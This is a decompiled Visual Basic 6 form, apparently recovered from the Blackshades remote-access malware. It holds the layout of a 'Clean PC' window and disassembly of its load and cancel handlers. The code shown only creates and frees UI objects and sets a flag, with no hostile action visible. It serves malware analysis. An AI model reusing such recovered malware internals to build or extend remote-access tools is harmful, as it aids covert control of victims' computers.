VERSION 5.00
Begin VB.Form frmCleanPC
  Caption = "Blackshades - Clean PC"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 1 'Fixed Single
  Icon = "frmCleanPC.frx":0
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 45
  ClientTop = 375
  ClientWidth = 11145
  ClientHeight = 4260
  StartUpPosition = 1 'CenterOwner
  Begin XtremeSuiteControls.ProgressBar pbProgress
    Left = 960
    Top = 3900
    Width = 7815
    Height = 255
    TabIndex = 0
  End
  Begin MSComctlLib.ListView lstResults
    Left = 120
    Top = 480
    Width = 10935
    Height = 3255
    TabIndex = 5
  End
  Begin XtremeSuiteControls.PushButton cmdCancel
    Left = 9720
    Top = 3840
    Width = 1335
    Height = 375
    TabIndex = 6
  End
  Begin VB.Label lblMain
    Caption = "N/A"
    Index = 3
    Left = 1440
    Top = 120
    Width = 9615
    Height = 255
    TabIndex = 4
  End
  Begin VB.Label lblMain
    Caption = "Current process:"
    Index = 2
    Left = 120
    Top = 120
    Width = 1215
    Height = 255
    TabIndex = 3
  End
  Begin VB.Label lblMain
    Caption = "0 %"
    Index = 1
    Left = 8880
    Top = 3900
    Width = 735
    Height = 255
    TabIndex = 2
  End
  Begin VB.Label lblMain
    Caption = "Progress:"
    Index = 0
    Left = 120
    Top = 3900
    Width = 735
    Height = 255
    TabIndex = 1
  End
End

Attribute VB_Name = "frmCleanPC"


Private sub Form__8C1BF0
008C1BF0: push ebp
008C1BF1: mov ebp, esp
008C1BF3: sub esp, 0000000Ch
008C1BF6: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008C1BFB: mov eax, fs:[00h]
008C1C01: push eax
008C1C02: mov fs:[00000000h], esp
008C1C09: push 0000004Ch
008C1C0B: pop eax
008C1C0C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008C1C11: push ebx
008C1C12: push esi
008C1C13: push edi
008C1C14: mov var_0C, esp
008C1C17: mov var_08, 0040F310h
008C1C1E: mov eax, [ebp+08h]
008C1C21: and eax, 00000001h
008C1C24: mov var_04, eax
008C1C27: mov eax, [ebp+08h]
008C1C2A: and al, FEh
008C1C2C: mov [ebp+08h], eax
008C1C2F: mov eax, [ebp+08h]
008C1C32: mov eax, [eax]
008C1C34: push [ebp+08h]
008C1C37: call [eax+04h]
008C1C3A: push 004412BCh
008C1C3F: push 00000000h
008C1C41: push 00000007h
008C1C43: mov eax, [ebp+08h]
008C1C46: mov eax, [eax]
008C1C48: push [ebp+08h]
008C1C4B: call [eax+00000304h]
008C1C51: push eax
008C1C52: lea eax, var_18
008C1C55: push eax
008C1C56: call 00410A84h ; Set (object)
008C1C5B: push eax
008C1C5C: lea eax, var_2C
008C1C5F: push eax
008C1C60: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008C1C65: add esp, 00000010h
008C1C68: push eax
008C1C69: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008C1C6E: push eax
008C1C6F: lea eax, var_1C
008C1C72: push eax
008C1C73: call 00410A84h ; Set (object)
008C1C78: mov var_50, eax
008C1C7B: mov eax, var_50
008C1C7E: mov eax, [eax]
008C1C80: push var_50
008C1C83: call [eax+2Ch]
008C1C86: fclex 
008C1C88: mov var_54, eax
008C1C8B: cmp var_54, 00000000h
008C1C8F: jnl 8C1CA8h
008C1C91: push 0000002Ch
008C1C93: push 004412BCh
008C1C98: push var_50
008C1C9B: push var_54
008C1C9E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008C1CA3: mov var_60, eax
008C1CA6: jmp 8C1CACh
008C1CA8: and var_60, 00000000h
008C1CAC: lea eax, var_1C
008C1CAF: push eax
008C1CB0: lea eax, var_18
008C1CB3: push eax
008C1CB4: push 00000002h
008C1CB6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008C1CBB: add esp, 0000000Ch
008C1CBE: lea ecx, var_2C
008C1CC1: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008C1CC6: and var_34, 00000000h
008C1CCA: mov var_3C, 00000002h
008C1CD1: push 00000010h
008C1CD3: pop eax
008C1CD4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008C1CD9: lea esi, var_3C
008C1CDC: mov edi, esp
008C1CDE: movsd 
008C1CDF: movsd 
008C1CE0: movsd 
008C1CE1: movsd 
008C1CE2: push 00000000h
008C1CE4: mov eax, [ebp+08h]
008C1CE7: mov eax, [eax]
008C1CE9: push [ebp+08h]
008C1CEC: call [eax+00000300h]
008C1CF2: push eax
008C1CF3: lea eax, var_18
008C1CF6: push eax
008C1CF7: call 00410A84h ; Set (object)
008C1CFC: push eax
008C1CFD: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008C1D02: lea ecx, var_18
008C1D05: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008C1D0A: mov var_04, 00000000h
008C1D11: push 008C1D34h
008C1D16: jmp 8C1D33h
008C1D18: lea eax, var_1C
008C1D1B: push eax
008C1D1C: lea eax, var_18
008C1D1F: push eax
008C1D20: push 00000002h
008C1D22: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008C1D27: add esp, 0000000Ch
008C1D2A: lea ecx, var_2C
008C1D2D: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008C1D32: ret 
End Sub

Private sub cmdCancel__8C1AF3
008C1AF3: push ebp
008C1AF4: mov ebp, esp
008C1AF6: sub esp, 0000000Ch
008C1AF9: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008C1AFE: mov eax, fs:[00h]
008C1B04: push eax
008C1B05: mov fs:[00000000h], esp
008C1B0C: push 00000030h
008C1B0E: pop eax
008C1B0F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008C1B14: push ebx
008C1B15: push esi
008C1B16: push edi
008C1B17: mov var_0C, esp
008C1B1A: mov var_08, 0040F300h
008C1B21: mov eax, [ebp+08h]
008C1B24: and eax, 00000001h
008C1B27: mov var_04, eax
008C1B2A: mov eax, [ebp+08h]
008C1B2D: and al, FEh
008C1B2F: mov [ebp+08h], eax
008C1B32: mov eax, [ebp+08h]
008C1B35: mov eax, [eax]
008C1B37: push [ebp+08h]
008C1B3A: call [eax+04h]
008C1B3D: and var_20, 00000000h
008C1B41: mov var_28, 0000000Bh
008C1B48: cmp [008F257Ch], 00000000h
008C1B4F: jnz 8C1B69h
008C1B51: push 008F257Ch
008C1B56: push 004162B8h
008C1B5B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008C1B60: mov var_44, 008F257Ch
008C1B67: jmp 8C1B70h
008C1B69: mov var_44, 008F257Ch
008C1B70: push 00000010h
008C1B72: pop eax
008C1B73: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008C1B78: lea esi, var_28
008C1B7B: mov edi, esp
008C1B7D: movsd 
008C1B7E: movsd 
008C1B7F: movsd 
008C1B80: movsd 
008C1B81: push 8001000Dh
008C1B86: mov eax, var_44
008C1B89: mov eax, [eax]
008C1B8B: mov ecx, var_44
008C1B8E: mov ecx, [ecx]
008C1B90: mov ecx, [ecx]
008C1B92: push eax
008C1B93: call [ecx+00000308h]
008C1B99: push eax
008C1B9A: lea eax, var_18
008C1B9D: push eax
008C1B9E: call 00410A84h ; Set (object)
008C1BA3: push eax
008C1BA4: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008C1BA9: lea ecx, var_18
008C1BAC: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008C1BB1: or word ptr [008F2590h], FFFFh
008C1BB9: mov var_04, 00000000h
008C1BC0: push 008C1BD1h
008C1BC5: jmp 8C1BD0h
008C1BC7: lea ecx, var_18
008C1BCA: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008C1BCF: ret 
End Sub

